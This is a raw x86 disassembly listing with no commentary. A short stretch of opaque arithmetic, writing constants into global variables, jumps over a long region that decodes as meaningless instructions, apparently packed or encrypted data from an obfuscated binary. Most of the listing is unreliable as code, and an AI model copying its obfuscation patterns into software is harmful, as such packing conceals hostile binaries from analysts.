  40ed43:	xor    edx,0x2021
  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x4227a4
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x42279c,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x42279c
  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x422281
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x42279c
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	nop
  40ee76:	test   eax,0x12ede3a6
  40ee7b:	mov    esi,0xbec401be
  40ee80:	mov    esi,0x926c45ce
  40ee85:	jae    0x40ee44
  40ee87:	stos   DWORD PTR es:[edi],eax
  40ee88:	mov    ecx,0xe863a724
  40ee8d:	into   
  40ee8e:	mov    al,0xff
  40ee90:	(bad)  
  40ee91:	mov    eax,DWORD PTR [edx]
  40ee93:	xchg   ecx,eax
  40ee94:	(bad)  
  40ee95:	imul   ebx,DWORD PTR [edx-0x58],0xffffffdc
  40ee99:	test   eax,0xe5dab13b
  40ee9e:	hlt    
  40ee9f:	inc    esi
  40eea0:	fs iret 
  40eea2:	sti    
  40eea3:	rcl    esp,1
  40eea5:	xor    eax,0xcc0968cf
  40eeaa:	sub    al,0x51
  40eeac:	dec    esi
  40eead:	mov    dl,BYTE PTR [edx+eax*2]
  40eeb0:	je     0x40ef11
  40eeb2:	add    BYTE PTR [esi],0x26
  40eeb5:	sub    DWORD PTR [ebx+0x744b37d7],esp
  40eebb:	int3   
  40eebc:	jmp    0x3578d672
  40eec1:	jo     0x40ef30
  40eec3:	(bad)  
  40eec4:	je     0x40ee94
  40eec6:	scas   eax,DWORD PTR es:[edi]
  40eec7:	jp     0x40eec8
  40eec9:	cmp    edx,DWORD PTR [ebx+ecx*8+0x198d736]
  40eed0:	lea    ecx,[edx+0x13]
  40eed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eed4:	in     al,0xe3
  40eed6:	or     BYTE PTR [edi+eax*4-0x6a],bl
  40eeda:	xchg   ebp,eax
  40eedb:	les    edi,FWORD PTR [ecx+edx*4+0x4e]
  40eedf:	nop
  40eee0:	imul   esi,DWORD PTR [edi-0x56],0x20
  40eee4:	fcomp  QWORD PTR [edx+0x33]
  40eee7:	enter  0x8c0a,0x98
  40eeeb:	scas   eax,DWORD PTR es:[edi]
  40eeec:	js     0x40ee8d
  40eeee:	test   DWORD PTR [edx+0x40],ecx
  40eef1:	and    al,0x1b
  40eef3:	adc    DWORD PTR [ebx+0x1a],eax
  40eef6:	mov    bl,al
  40eef8:	std    
  40eef9:	out    dx,al
  40eefa:	add    ch,0xbe
  40eefd:	mov    bl,0xb5
  40eeff:	ds push eax
  40ef01:	push   0x1eebfc73
  40ef06:	cmp    eax,0x61dddd8f
  40ef0b:	std    
  40ef0c:	(bad)  
  40ef0d:	(bad)  
  40ef0f:	imul   edx,DWORD PTR [edx],0x8f55610e
  40ef15:	add    DWORD PTR [ecx],edi
  40ef17:	xchg   esp,eax
  40ef18:	mov    eax,0xdd89d666
  40ef1d:	jmp    DWORD PTR [ebp+0x6b66bf89]
  40ef23:	xchg   edx,eax
  40ef24:	jmp    0x816bf76f
  40ef29:	mov    bl,0xc9
  40ef2b:	mov    dh,ch
  40ef2d:	pop    edx
  40ef2e:	les    ebx,FWORD PTR [ecx+0xec53410]
  40ef34:	les    ecx,FWORD PTR [esi+0x39c99a6a]
  40ef3a:	mov    edi,0x6ef97a3f
  40ef3f:	clc    
  40ef40:	pop    ds
  40ef41:	xchg   esi,eax
  40ef42:	ss sahf 
  40ef44:	es stos BYTE PTR es:[edi],al
  40ef46:	jecxz  0x40ef8a
  40ef48:	xchg   ebx,eax
  40ef49:	sti    
  40ef4a:	ficom  WORD PTR [ebp-0x1e4b3b97]
  40ef50:	jmp    0x40efbb
  40ef52:	and    al,0x72
  40ef54:	dec    esp
  40ef55:	or     ecx,eax
  40ef57:	pop    ebx
  40ef58:	inc    eax
  40ef59:	out    dx,eax
  40ef5a:	mov    esp,0x5a9f1a5b
  40ef5f:	idiv   cl
  40ef61:	pop    esp
  40ef62:	mov    esi,DWORD PTR [ebx+0x6d94804b]
  40ef68:	cmp    edx,DWORD PTR [ebx]
  40ef6a:	push   cs
  40ef6b:	or     al,0xd
  40ef6d:	pushf  
  40ef6e:	call   0xa135:0x40fa1caf
  40ef75:	push   esp
  40ef76:	into   
  40ef77:	sub    edi,edx
  40ef79:	adc    DWORD PTR [esi-0x5fb4046f],0xed6dfa33
  40ef83:	adc    ebx,DWORD PTR [eax-0x3a36858a]
  40ef89:	push   edx
  40ef8a:	outs   dx,DWORD PTR ds:[esi]
  40ef8b:	std    
  40ef8c:	dec    ecx
  40ef8d:	xchg   edi,eax
  40ef8e:	xor    esi,DWORD PTR [eax+0x272343a3]
  40ef94:	lahf   
  40ef95:	push   ebx
  40ef96:	inc    ebx
  40ef97:	jg     0x40ef1d
  40ef99:	jbe    0x40effc
  40ef9b:	stc    
  40ef9c:	pusha  
  40ef9d:	fs sub eax,0x42fad138
  40efa3:	je     0x40f014
  40efa5:	ss dec edi
  40efa7:	and    eax,DWORD PTR [ecx-0x25]
  40efaa:	adc    al,0xd2
  40efac:	xor    edi,DWORD PTR [ebp-0x5e33a7c8]
  40efb2:	and    DWORD PTR [esi],0xffffffe9
  40efb5:	mul    DWORD PTR [eax-0x2ec5af29]
  40efbb:	push   ebx
  40efbc:	call   FWORD PTR [esi+0x2d]
  40efbf:	retf   0xafb4
  40efc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efc3:	arpl   WORD PTR [ebx],bp
  40efc5:	shr    BYTE PTR [ebp+0x5fbf5515],1
  40efcb:	sub    al,0x6c
  40efcd:	sub    DWORD PTR [ecx+eax*1-0x4fd7b6cb],edi
  40efd4:	(bad)  
  40efd5:	fsubr  QWORD PTR [ebx-0x70]
  40efd8:	sub    BYTE PTR [edi+edi*8-0x19],dl
  40efdc:	xor    cl,ch
  40efde:	arpl   WORD PTR [eax+ecx*1],sp
  40efe1:	xchg   DWORD PTR [edi],esi
  40efe3:	adc    esp,DWORD PTR [edi+0x797a4557]
  40efe9:	jg     0x40f01b
  40efeb:	test   dl,ah
  40efed:	jnp    0x40f006
  40efef:	fsub   st,st(7)
  40eff1:	dec    ebp
  40eff2:	aad    0xaa
  40eff4:	jg     0x40f012
  40eff6:	je     0x40ef94
  40eff8:	sbb    bh,BYTE PTR ds:0x9910dda2
  40effe:	push   ds
  40efff:	mov    esi,0x2d30f5af
  40f004:	gs (bad) 
  40f006:	pop    edx
  40f007:	and    esi,DWORD PTR [esi+0x19370660]
  40f00d:	mov    cl,0x9f
  40f00f:	adc    eax,ebx
  40f011:	lock dec ecx
  40f013:	ret    
  40f014:	dec    edi
  40f015:	iret   
  40f016:	fidiv  DWORD PTR [edi+0x39]
  40f019:	mov    ss,WORD PTR [ebp+edx*1-0x33]
  40f01d:	ret    0x363a
  40f020:	arpl   WORD PTR ds:0xeb8f7b42,bx
  40f026:	jp     0x40efc2
  40f028:	inc    eax
  40f029:	fldenv [esi]
  40f02b:	xor    DWORD PTR [eax+0xbf855ce],edx
  40f031:	fs sahf 
  40f033:	push   esi
  40f034:	xchg   ecx,eax
  40f035:	push   ss
  40f036:	jmp    0x40eff9
  40f038:	je     0x40f05e
  40f03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f03b:	stos   DWORD PTR es:[edi],eax
  40f03c:	sbb    BYTE PTR [edx-0x72b411b],0xe3
  40f043:	xchg   edx,eax
  40f044:	dec    ebp
  40f045:	add    ch,BYTE PTR [ebx]
  40f047:	sbb    dh,bl
  40f049:	mov    esi,0x4cf07d91
  40f04e:	push   0x23
  40f050:	inc    esp
  40f051:	xchg   edx,eax
  40f052:	jmp    0xda69:0xb6a1dfa
  40f059:	and    BYTE PTR [edi-0x541f5455],al
  40f05f:	jnp    0x40f063
  40f061:	stos   DWORD PTR es:[edi],eax
  40f062:	sbb    cl,ah
  40f064:	pop    ss
  40f065:	xchg   ebp,eax
  40f066:	jle    0x40f0cb
  40f068:	mov    BYTE PTR [ecx],al
  40f06a:	jns    0x40f0c6
  40f06c:	cmp    al,bh
  40f06e:	pop    ebp
  40f06f:	cld    
  40f070:	dec    edi
  40f071:	jle    0x40f073
  40f073:	fs cmp eax,0x841e21ae
  40f079:	mov    ebx,0x88a5f007
  40f07e:	lsl    eax,WORD PTR [edx+0x27]
  40f082:	nop
  40f083:	add    cl,bl
  40f085:	dec    ebp
  40f086:	add    eax,0xa15f0b9d
  40f08b:	mov    al,ds:0x553a34f8
  40f090:	nop
  40f091:	jp     0x40f0c2
  40f093:	inc    eax
  40f095:	repnz hlt 
  40f097:	jne    0x40f06a
  40f099:	sbb    DWORD PTR [edi],edx
  40f09b:	popf   
  40f09c:	sti    
  40f09d:	and    cl,BYTE PTR [ecx]
  40f09f:	jbe    0x40f03b
  40f0a1:	rcl    BYTE PTR [edx+0x3166fd1],1
  40f0a7:	fist   DWORD PTR [ebx+eax*8+0x7b309afb]
  40f0ae:	sub    dl,dh
  40f0b0:	adc    al,0x74
  40f0b2:	jmp    0x40f051
  40f0b4:	sub    ebx,DWORD PTR gs:[eax-0x63bfe10a]
  40f0bb:	jno    0x40f06d
  40f0bd:	jns    0x40f071
  40f0bf:	jne    0x40f10e
  40f0c1:	ret    
  40f0c2:	fistp  QWORD PTR [esp+edi*1+0x7a]
  40f0c6:	pop    esi
  40f0c7:	lahf   
  40f0c8:	jns    0x40f0a3
  40f0ca:	xchg   edx,eax
  40f0cb:	cmp    edi,esp
  40f0cd:	dec    BYTE PTR [ecx+0x3d]
  40f0d0:	fcomi  st,st(3)
  40f0d2:	cmc    
  40f0d3:	xor    DWORD PTR [esi-0x9],ebx
  40f0d6:	jnp    0x40f065
  40f0d8:	or     edi,DWORD PTR [edx+ebp*2+0x760de16d]
  40f0df:	jmp    0x474cb5f1
  40f0e4:	aas    
  40f0e5:	test   ah,ah
  40f0e7:	xchg   BYTE PTR [edi],ah
  40f0e9:	repz or ecx,DWORD PTR [esi-0x22b0c49e]
  40f0f0:	mov    ecx,0xffec12cb
  40f0f5:	mov    ah,BYTE PTR ds:0x6c43c74e
  40f0fb:	xor    ebx,ebp
  40f0fd:	sbb    al,BYTE PTR [eax+0x4e]
  40f100:	call   0x2e51:0x8a00186d
  40f107:	lea    edi,[edi-0x5b]
  40f10a:	es sub ecx,edx
  40f10d:	aaa    
  40f10e:	sub    DWORD PTR [ebx+0x3f5021be],0xb36f5f8
  40f118:	pusha  
  40f119:	jecxz  0x40f191
  40f11b:	mov    ds:0x9e9c966e,eax
  40f120:	fsubr  DWORD PTR [ebp+0x18]
  40f123:	(bad)  
  40f124:	(bad)  
  40f125:	in     al,0x9b
  40f127:	push   0x40f03147
  40f12c:	mov    cl,0x8b
  40f12e:	mov    bl,0x29
  40f130:	pop    es
  40f131:	and    DWORD PTR [ecx],esi
  40f133:	imul   BYTE PTR [edi+edx*1]
  40f136:	xor    ch,BYTE PTR [ecx+edi*4]
  40f139:	fwait
  40f13a:	cmp    DWORD PTR [edi],esp
  40f13c:	push   edi
  40f13d:	(bad)  
  40f13e:	cmp    BYTE PTR ds:0xe5ad804f,dh
  40f144:	or     dl,BYTE PTR [edx-0x70]
  40f147:	mov    edi,0x9763b9d2
  40f14c:	adc    edi,DWORD PTR [esi-0x795b33b6]
  40f152:	mov    eax,DWORD PTR [esi]
  40f154:	mov    bh,0x61
  40f156:	cmp    ebx,esi
  40f158:	xor    DWORD PTR [edx+0x63],ebp
  40f15b:	ins    BYTE PTR es:[edi],dx
  40f15c:	call   0xf8c75f7a
  40f161:	je     0x40f10f
  40f163:	and    BYTE PTR [ecx-0x37],0xda
  40f167:	or     ebp,eax
  40f169:	xchg   al,dl
  40f16b:	js     0x40f137
  40f16d:	mov    ebx,ebx
  40f16f:	sbb    eax,0xbb8b78e3
  40f174:	je     0x40f1eb
  40f176:	sub    ch,0x5f
  40f179:	(bad)  
  40f17a:	adc    eax,0xf53ec8f1
  40f17f:	test   BYTE PTR [edx+0x35],bl
  40f182:	mov    esp,0x2d863da7
  40f187:	iret   
  40f188:	xchg   ebx,eax
  40f189:	dec    ebx
  40f18a:	ret    0xfec
  40f18d:	ret    
  40f18e:	dec    ecx
  40f18f:	pop    ebp
  40f190:	fcmovnb st,st(3)
  40f192:	or     DWORD PTR [eax],edx
  40f194:	(bad)  
  40f195:	sti    
  40f196:	out    dx,eax
  40f197:	repnz mov esi,0x9e5ec29a
  40f19d:	xchg   esi,eax
  40f19e:	popf   
  40f19f:	pop    ds
  40f1a0:	push   0x32
  40f1a2:	pop    esi
  40f1a3:	retf   
  40f1a4:	pop    edx
  40f1a5:	call   0x2d85:0xfd13b94
  40f1ac:	add    BYTE PTR [eax],al
  40f1ae:	add    BYTE PTR [ebx],bh
  40f1b0:	lock jne 0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x42279c
  40f1d7:	mov    ds:0x4227a4,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8+0x45]
  40f1fb:	int3   
  40f1fc:	ss xchg edx,eax
  40f1fe:	xor    DWORD PTR [eax],ebx
  40f200:	mov    esi,0xbec4e3be
  40f205:	mov    esi,0xdcaac138
  40f20a:	xchg   BYTE PTR [edx-0x3f7888a4],cl
  40f210:	outs   dx,BYTE PTR ds:[esi]
  40f211:	enter  0xeb19,0xcd
  40f215:	sub    DWORD PTR [edx-0x56],ebp
  40f218:	imul   DWORD PTR [edi]
  40f21a:	mov    bh,0x78
  40f21c:	sbb    edx,edx
  40f21e:	addr16 dec esp
  40f220:	adc    BYTE PTR [esi],0xde
  40f223:	loopne 0x40f245
  40f225:	call   0xc90136c9
  40f22a:	jmp    0xc45748e4
  40f22f:	mov    ah,0xb4
  40f231:	repz adc al,0x25
  40f234:	add    eax,0xaf67733e
  40f239:	popa   
  40f23a:	js     0x40f1c2
  40f23c:	fisubr WORD PTR [ebx+0x3c]
  40f23f:	mov    bh,0x98
  40f241:	ret    0x53c
  40f244:	xor    ebp,esp
  40f246:	leave  
  40f247:	in     al,dx
  40f248:	dec    ebx
  40f249:	arpl   WORD PTR [edx-0x2110f0b],ax
  40f24f:	(bad)  
  40f250:	int    0x75
  40f252:	pop    es
  40f253:	(bad)  
  40f254:	out    0x85,al
  40f256:	dec    edi
  40f257:	mov    edx,0x3d7b1afd
  40f25c:	xor    ah,BYTE PTR [ebp-0x3d2dc913]
  40f262:	dec    eax
  40f263:	sbb    esp,DWORD PTR [ecx]
  40f265:	cmc    
  40f266:	sbb    ah,bl
  40f268:	fdivr  DWORD PTR fs:[esi+0x1a]
  40f26c:	adc    BYTE PTR [ebx-0x38da389c],dl
  40f272:	sub    eax,ebp
  40f274:	adc    dh,al
  40f276:	mov    ds:0x1fe6b64c,al
  40f27b:	out    dx,al
  40f27c:	aaa    
  40f27d:	push   cs
  40f27e:	xor    al,0x31
  40f280:	inc    ecx
  40f281:	retf   
  40f282:	je     0x40f2f2
  40f284:	lds    edx,FWORD PTR [edi+0x75ed407f]
  40f28a:	imul   ebp,DWORD PTR [ecx+0x49ed8068],0xde5485a3
  40f294:	sar    eax,1
  40f296:	mov    esp,0xb72d9e23
  40f29b:	inc    ecx
  40f29c:	jle    0x40f21f
  40f29e:	aas    
  40f29f:	mov    al,BYTE PTR [eax-0x6b04ab3e]
  40f2a5:	dec    ebx
  40f2a6:	enter  0x12e,0x42
  40f2aa:	push   ebx
  40f2ab:	push   edi
  40f2ac:	xchg   DWORD PTR [ebx+ebx*4+0x24],esp
  40f2b0:	pop    ss
  40f2b1:	or     BYTE PTR [ebx-0x5c4d6228],bh
  40f2b7:	dec    eax
  40f2b8:	xor    eax,0xcf510a3f
  40f2bd:	test   eax,0xd4a21160
  40f2c2:	push   es
  40f2c3:	dec    esi
  40f2c4:	jmp    0x20c7:0x9f2d53fc
  40f2cb:	dec    eax
  40f2cc:	or     BYTE PTR [ebp-0x7f],bh
  40f2cf:	(bad)  
  40f2d0:	push   esi
  40f2d1:	rcr    DWORD PTR [esi+0x427fed0d],cl
  40f2d7:	cmp    eax,0xbb994d91
  40f2dc:	sbb    DWORD PTR [edi],edx
  40f2de:	adc    al,0x8f
  40f2e0:	mov    edi,0x923f70
  40f2e5:	out    dx,al
  40f2e6:	imul   ecx,DWORD PTR [ebx],0xffffffb2
  40f2e9:	lock cdq 
  40f2eb:	mov    ah,0x39
  40f2ed:	mov    ds:0xadfd3742,al
  40f2f2:	jp     0x40f2ed
  40f2f4:	test   eax,0x6b4f9093
  40f2f9:	gs jecxz 0x40f315
  40f2fc:	mov    DWORD PTR [edx+0xd5bb920],esp
  40f302:	adc    esp,esi
  40f304:	adc    eax,0x392f1117
  40f309:	cld    
  40f30a:	push   cs
  40f30b:	push   cs
  40f30c:	mov    ch,0x59
  40f30e:	fadd   DWORD PTR [edi-0x58]
  40f311:	lds    eax,FWORD PTR [edi-0x530f867c]
  40f317:	sub    dh,BYTE PTR [edi]
  40f319:	add    eax,DWORD PTR ds:[esi-0x6dd7dbb9]
  40f320:	mov    ch,0xcb
  40f322:	adc    DWORD PTR [edi],ebx
  40f324:	mov    ebp,0x371f19a6
  40f329:	shl    DWORD PTR [edx-0xca62350],1
  40f32f:	cs pop ebp
  40f331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f332:	and    BYTE PTR [edi+0xc],0x61
  40f336:	mov    esi,DWORD PTR [ecx-0x59]
  40f339:	jnp    0x40f30c
  40f33b:	or     ah,BYTE PTR [ebp+0x4c]
  40f33e:	push   ebx
  40f33f:	shl    BYTE PTR [ecx+0x51],cl
  40f342:	cmp    al,0xb7
  40f344:	inc    esi
  40f345:	dec    eax
  40f346:	int    0xfb
  40f348:	push   cs
  40f349:	push   ss
  40f34a:	push   0xffffffec
  40f34c:	or     BYTE PTR [eax],dl
  40f34e:	inc    ecx
  40f34f:	(bad)  
  40f350:	mov    edi,0x9ea97eb1
  40f355:	mov    eax,ds:0xa87f5c86
  40f35a:	xchg   BYTE PTR [edx+0x7c],dl
  40f35d:	sbb    eax,0xa003da4b
  40f362:	lahf   
  40f363:	inc    ecx
  40f364:	sub    esi,edi
  40f366:	shr    DWORD PTR [eax-0x79],cl
  40f369:	mov    ebx,0x5d5b8eab
  40f36e:	fdiv   QWORD PTR [ecx+0x54]
  40f371:	or     ah,al
  40f373:	fdiv   DWORD PTR [ebp+0x6869d3c2]
  40f379:	pop    ebp
  40f37a:	mov    edx,0x2113ff76
  40f37f:	jns    0x40f324
  40f381:	dec    eax
  40f382:	out    0x8b,al
  40f384:	jle    0x40f36e
  40f386:	bound  esp,QWORD PTR [edx]
  40f388:	js     0x40f3cb
  40f38a:	mov    al,0xa9
  40f38c:	jne    0x40f3ad
  40f38e:	push   eax
  40f38f:	stc    
  40f390:	aaa    
  40f391:	cmp    BYTE PTR [edi-0x1a],bh
  40f394:	leave  
  40f395:	retf   0x84b7
  40f398:	or     edx,DWORD PTR ds:0x9f5106b0
  40f39e:	sbb    al,0x1e
  40f3a0:	inc    ebx
  40f3a1:	popf   
  40f3a2:	dec    esi
  40f3a3:	push   DWORD PTR [ecx-0x33]
  40f3a6:	jl     0x40f35e
  40f3a8:	inc    edi
  40f3a9:	repnz and ecx,ecx
  40f3ac:	shr    BYTE PTR [edi+0x21],1
  40f3af:	lahf   
  40f3b0:	sbb    al,al
  40f3b2:	push   ebp
  40f3b3:	fcomp  QWORD PTR [eax+0x12ecafa8]
  40f3b9:	xor    eax,0x12f2619e
  40f3be:	mov    eax,ds:0x28f76a9c
  40f3c3:	and    bl,BYTE PTR [ecx-0x20552953]
  40f3c9:	fcomi  st,st(3)
  40f3cb:	mov    ebp,0x40fe9da8
  40f3d0:	sbb    al,0x34
  40f3d2:	aaa    
  40f3d3:	mov    edx,0x779e9cc4
  40f3d8:	mov    ebp,0x9ec4cc2f
  40f3dd:	and    eax,DWORD PTR [esi-0x7c7edbac]
  40f3e3:	jge    0x40f381
  40f3e5:	xchg   ecx,eax
  40f3e6:	fimul  WORD PTR [ebx]
  40f3e8:	mov    dh,0xd7
  40f3ea:	mov    esp,0xa58fe60d
  40f3ef:	loop   0x40f395
  40f3f1:	repnz adc al,0x64
  40f3f4:	adc    eax,0x41affa60
  40f3f9:	lods   al,BYTE PTR ds:[esi]
  40f3fa:	dec    edx
  40f3fb:	lock xor esi,edi
  40f3fe:	out    0xd1,eax
  40f400:	jmp    0xf7dc:0xc1f2836e
  40f407:	jle    0x40f45d
  40f409:	sbb    eax,0xc0358f71
  40f40e:	xlat   BYTE PTR ds:[ebx]
  40f40f:	pop    esp
  40f410:	enter  0x7128,0x63
  40f414:	dec    esp
  40f415:	jne    0x40f44f
  40f417:	jae    0x40f416
  40f419:	bound  ecx,QWORD PTR [ecx-0x6f618ee1]
  40f41f:	dec    edx
  40f420:	(bad)  
  40f423:	inc    ebp
  40f424:	test   eax,0xf2da0a69
  40f429:	jmp    0x40f480
  40f42b:	sbb    al,0xe3
  40f42d:	rcr    BYTE PTR [esi],0x22
  40f430:	daa    
  40f431:	retf   
  40f432:	daa    
  40f433:	shl    DWORD PTR [ecx+0x6f],cl
  40f436:	shl    BYTE PTR [eax-0x7f],0xac
  40f43a:	xchg   esi,eax
  40f43b:	add    al,0x15
  40f43d:	in     al,dx
  40f43e:	pop    edx
  40f43f:	fs push es
  40f441:	cli    
  40f442:	cmp    bl,dl
  40f444:	pop    ds
  40f445:	and    eax,0x1be48db8
  40f44a:	ret    
  40f44b:	(bad)  
  40f44c:	bound  ebp,QWORD PTR [edx+edx*1+0x43c634ce]
  40f453:	mov    bl,0x3b
  40f455:	cmp    eax,0x3d545786
  40f45a:	or     ch,0x43
  40f45d:	lahf   
  40f45e:	inc    esi
  40f45f:	push   esp
  40f460:	arpl   bp,dx
  40f462:	jp     0x40f4c7
  40f464:	rcl    DWORD PTR [esi+0x30742d32],cl
  40f46a:	and    edi,DWORD PTR [eax]
  40f46c:	or     DWORD PTR [ecx-0x43],esp
  40f46f:	cmp    BYTE PTR [esi+esi*1],cl
  40f472:	icebp  
  40f473:	cmp    al,0x72
  40f475:	or     DWORD PTR [eax],edi
  40f477:	in     eax,dx
  40f478:	cmp    dh,dl
  40f47a:	ret    
  40f47b:	adc    eax,0x5adb6e06
  40f480:	inc    esp
  40f481:	xchg   DWORD PTR [ecx+0x3e],edx
  40f484:	mov    ?,WORD PTR [ecx-0x31]
  40f487:	iret   
  40f488:	mov    ah,0x69
  40f48a:	stc    
  40f48b:	xor    al,0xb0
  40f48d:	lea    edi,[edi]
  40f48f:	shl    BYTE PTR [ecx-0xe46f97e],0xc8
  40f496:	push   esi
  40f497:	dec    esi
  40f498:	xor    eax,0x994caf9f
  40f49d:	or     esp,edx
  40f49f:	daa    
  40f4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a1:	mov    ch,0x32
  40f4a3:	(bad)  
  40f4a4:	cmc    
  40f4a5:	imul   edi,DWORD PTR ds:0x6d65ccca,0x26
  40f4ac:	inc    edx
  40f4ad:	aas    
  40f4ae:	fwait
  40f4af:	cwde   
  40f4b0:	cld    
  40f4b1:	mov    esp,DWORD PTR [edi-0x7bc2faca]
  40f4b7:	jbe    0x40f495
  40f4b9:	add    eax,0xe29d7e4
  40f4be:	jg     0x40f465
  40f4c0:	out    0x8c,eax
  40f4c2:	pushf  
  40f4c3:	cmp    eax,0x1f9e3ac3
  40f4c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c9:	into   
  40f4ca:	test   BYTE PTR [ebx],al
  40f4cc:	popf   
  40f4cd:	mov    bh,0x48
  40f4cf:	push   ecx
  40f4d0:	jae    0x40f484
  40f4d2:	mov    ds:0x8f8fba53,eax
  40f4d7:	js     0x40f4ea
  40f4d9:	jnp    0x40f4c9
  40f4db:	popa   
  40f4dc:	mov    bl,0xa3
  40f4de:	mov    edi,0x917f3924
  40f4e3:	ret    
  40f4e4:	les    ebp,FWORD PTR [edx-0x40cfd589]
  40f4ea:	call   0x7416:0x36d6e63c
  40f4f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f2:	je     0x40f4d5
  40f4f4:	mov    ch,0xe
  40f4f6:	ret    
  40f4f7:	dec    edi
  40f4f8:	loopne 0x40f4e4
  40f4fa:	dec    ebp
  40f4fb:	or     DWORD PTR [ebx+ebp*8+0x75],esi
  40f4ff:	es int3 
  40f501:	fst    DWORD PTR [ecx]
  40f503:	adc    bh,BYTE PTR ds:0x4ea29111
  40f509:	dec    ebp
  40f50a:	sub    ah,BYTE PTR [edi]
  40f50c:	into   
  40f50d:	fld    TBYTE PTR [edx-0x3]
  40f510:	jo     0x40f4d7
  40f512:	test   DWORD PTR ds:0xad511f81,ebx
  40f518:	into   
  40f519:	inc    edi
  40f51a:	lds    ebp,FWORD PTR [ebx+0x4f]
  40f51d:	repnz pop ecx
  40f51f:	add    DWORD PTR [eax-0x16],0x2e
  40f523:	das    
  40f524:	stos   DWORD PTR es:[edi],eax
  40f525:	sub    eax,0x65f95742
  40f52a:	imul   ebp,ebp,0xffffff97
  40f52d:	(bad)  
  40f52e:	(bad)  
  40f52f:	jp     0x40f57b
  40f531:	stos   DWORD PTR es:[edi],eax
  40f532:	xchg   ebp,eax
  40f533:	retf   0x3f19
  40f536:	stc    
  40f537:	cmp    dl,BYTE PTR [ecx+0x3b]
  40f53a:	clc    
  40f53b:	or     DWORD PTR [edx-0x5cad2f6b],0xca5adb6c
  40f545:	fdivr  QWORD PTR [eax-0x26b78c56]
  40f54b:	cs pop eax
  40f54d:	xchg   ebx,eax
  40f54e:	inc    eax
  40f54f:	ficomp WORD PTR [esi]
  40f551:	sub    eax,0x901d05b0
  40f556:	fst    st(1)
  40f558:	(bad)  
  40f559:	into   
  40f55a:	hlt    
  40f55b:	(bad)  
  40f55c:	loop   0x40f589
  40f55e:	hlt    
